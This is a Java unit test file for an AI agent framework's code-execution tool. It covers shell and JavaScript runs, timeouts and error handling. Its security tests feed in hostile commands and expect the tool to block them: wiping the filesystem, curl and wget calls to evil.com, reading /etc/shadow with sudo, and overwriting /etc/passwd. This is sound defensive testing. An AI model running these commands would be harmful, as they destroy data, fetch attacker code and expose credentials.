package ai.intelliswarm.swarmai.tool.common;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;

import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

@DisplayName("CodeExecutionTool Tests")
class CodeExecutionToolTest {

    private CodeExecutionTool codeExecTool;

    @BeforeEach
    void setUp() {
        codeExecTool = new CodeExecutionTool();
    }

    // ==================== Interface Tests ====================

    @Test
    @DisplayName("Should return correct function name")
    void testGetFunctionName() {
        assertEquals("code_execution", codeExecTool.getFunctionName());
    }

    @Test
    @DisplayName("Should return correct description")
    void testGetDescription() {
        assertNotNull(codeExecTool.getDescription());
        assertTrue(codeExecTool.getDescription().contains("javascript"));
        assertTrue(codeExecTool.getDescription().contains("shell"));
    }

    @Test
    @DisplayName("Should not be async")
    void testIsAsync() {
        assertFalse(codeExecTool.isAsync());
    }

    @Test
    @DisplayName("Should have correct parameter schema")
    void testGetParameterSchema() {
        Map<String, Object> schema = codeExecTool.getParameterSchema();
        assertNotNull(schema);

        @SuppressWarnings("unchecked")
        Map<String, Object> properties = (Map<String, Object>) schema.get("properties");
        assertTrue(properties.containsKey("code"));
        assertTrue(properties.containsKey("language"));
        assertTrue(properties.containsKey("timeout"));

        String[] required = (String[]) schema.get("required");
        assertEquals(1, required.length);
        assertEquals("code", required[0]);
    }

    // ==================== Shell Execution ====================

    @Test
    @DisplayName("Should execute simple shell echo")
    void testShellEcho() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "echo Hello World");
        params.put("language", "shell");

        Object result = codeExecTool.execute(params);

        String r = result.toString();
        assertFalse(r.startsWith("Error"), "Should not error. Got: " + r);
        assertTrue(r.contains("Hello World"), "Should capture echo output");
        assertTrue(r.contains("Exit Code:** 0"), "Should show exit code 0");
        assertTrue(r.contains("Success"), "Should show success status");
    }

    @Test
    @DisplayName("Should execute shell hostname command")
    void testShellHostname() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "echo test_output_123");
        params.put("language", "shell");
        params.put("timeout", 10);

        Object result = codeExecTool.execute(params);

        String r = result.toString();
        assertFalse(r.startsWith("Error"), "Should not error. Got: " + r);
        assertTrue(r.contains("test_output_123"), "Should have output");
    }

    @Test
    @DisplayName("Should execute shell with pipe")
    void testShellPipe() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "echo 'line1\nline2\nline3' | wc -l");
        params.put("language", "shell");

        Object result = codeExecTool.execute(params);

        String r = result.toString();
        assertFalse(r.startsWith("Error"), "Should not error. Got: " + r);
    }

    @Test
    @DisplayName("Should capture stderr from shell")
    void testShellStderr() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "ls /nonexistent_path_12345");
        params.put("language", "shell");

        Object result = codeExecTool.execute(params);

        String r = result.toString();
        // Should complete but with non-zero exit code
        assertTrue(r.contains("Exit Code") && !r.contains("Exit Code:** 0"),
            "Should have non-zero exit code");
    }

    // ==================== Shell Security ====================

    @Test
    @DisplayName("Should block rm command")
    void testBlockRm() {
        Object result = codeExecTool.execute(Map.of("code", "rm -rf /", "language", "shell"));
        assertTrue(result.toString().contains("Error"), "Should block rm");
        assertTrue(result.toString().contains("Blocked"), "Should mention blocked");
    }

    @Test
    @DisplayName("Should block curl/wget commands")
    void testBlockNetworkCommands() {
        for (String cmd : new String[]{"curl http://evil.com", "wget http://evil.com"}) {
            Object result = codeExecTool.execute(Map.of("code", cmd, "language", "shell"));
            assertTrue(result.toString().contains("Error"),
                "Should block: " + cmd + ". Got: " + result);
        }
    }

    @Test
    @DisplayName("Should block sudo")
    void testBlockSudo() {
        Object result = codeExecTool.execute(Map.of("code", "sudo cat /etc/shadow", "language", "shell"));
        assertTrue(result.toString().contains("Error"), "Should block sudo");
    }

    @Test
    @DisplayName("Should block piped dangerous commands")
    void testBlockPipedDangerous() {
        Object result = codeExecTool.execute(Map.of("code", "echo test | rm -rf /", "language", "shell"));
        assertTrue(result.toString().contains("Error"), "Should block piped rm");
    }

    @Test
    @DisplayName("Should block writes to system directories")
    void testBlockSystemWrites() {
        Object result = codeExecTool.execute(Map.of("code", "echo bad > /etc/passwd", "language", "shell"));
        assertTrue(result.toString().contains("Error"), "Should block writes to /etc/");
    }

    // ==================== Error Handling ====================

    @Test
    @DisplayName("Should handle null code")
    void testNullCode() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", null);

        Object result = codeExecTool.execute(params);
        assertTrue(result.toString().contains("Error"), "Should error on null code");
    }

    @Test
    @DisplayName("Should handle empty code")
    void testEmptyCode() {
        Object result = codeExecTool.execute(Map.of("code", ""));
        assertTrue(result.toString().contains("Error"), "Should error on empty code");
    }

    @Test
    @DisplayName("Should handle invalid language")
    void testInvalidLanguage() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "print('hello')");
        params.put("language", "python");

        Object result = codeExecTool.execute(params);
        assertTrue(result.toString().contains("Error"), "Should error on unsupported language");
        assertTrue(result.toString().contains("Unsupported"), "Should mention unsupported");
    }

    @Test
    @DisplayName("Should default to javascript language")
    void testDefaultLanguage() {
        // Without specifying language, should try JavaScript
        Object result = codeExecTool.execute(Map.of("code", "1 + 1"));
        // May succeed or fail depending on JS engine availability, but should not error on language
        assertFalse(result.toString().contains("Unsupported language"),
            "Should default to javascript, not unsupported");
    }

    // ==================== Edge Cases ====================

    @Test
    @DisplayName("Should respect timeout parameter")
    void testTimeoutParameter() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "echo fast");
        params.put("language", "shell");
        params.put("timeout", 5);

        Object result = codeExecTool.execute(params);
        assertFalse(result.toString().startsWith("Error"), "Short command should complete within timeout");
    }

    @Test
    @DisplayName("Should cap timeout at maximum")
    void testMaxTimeout() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "echo test");
        params.put("language", "shell");
        params.put("timeout", 9999);

        Object result = codeExecTool.execute(params);
        // Should not error — timeout is capped internally
        assertFalse(result.toString().startsWith("Error: Unsupported"),
            "Should cap timeout silently");
    }

    @Test
    @DisplayName("Should handle chained shell commands")
    void testChainedShell() {
        Map<String, Object> params = new HashMap<>();
        params.put("code", "echo first && echo second && echo third");
        params.put("language", "shell");

        Object result = codeExecTool.execute(params);

        String r = result.toString();
        assertFalse(r.startsWith("Error"), "Should handle chained commands. Got: " + r);
        assertTrue(r.contains("first"), "Should contain first output");
        assertTrue(r.contains("second"), "Should contain second output");
        assertTrue(r.contains("third"), "Should contain third output");
    }
}
